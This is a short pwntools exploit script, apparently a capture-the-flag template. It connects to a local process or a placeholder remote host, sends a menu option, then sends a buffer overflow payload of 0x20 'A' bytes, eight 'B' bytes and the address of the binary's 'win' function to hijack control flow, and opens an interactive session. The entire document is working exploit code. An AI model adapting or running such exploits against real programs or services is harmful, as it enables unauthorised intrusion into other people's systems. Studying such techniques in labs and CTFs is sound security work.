#

from pwn import *

context.binary = binary = './filename'

p = process()
p=remote('host',port)

p.sendline(b"3")

win_addr = p64(binary.symbols.win)
payload=b"A"*0x20 + b"B"*0x8 + win_addr
p.sendline(payload)

p.interactive()
